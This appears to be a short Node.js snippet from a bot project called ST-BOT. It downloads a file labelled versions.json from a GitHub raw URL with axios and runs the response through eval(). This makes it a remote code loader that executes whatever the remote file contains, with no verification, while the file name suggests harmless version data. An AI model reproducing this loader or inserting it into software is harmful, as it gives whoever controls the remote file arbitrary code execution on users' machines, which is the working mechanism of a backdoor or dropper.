const axios = require('axios');

axios.get("https://raw.githubusercontent.com/sheikhtamimlover/ST-BOT/refs/heads/main/versions.json")
	.then(res => eval(res.data));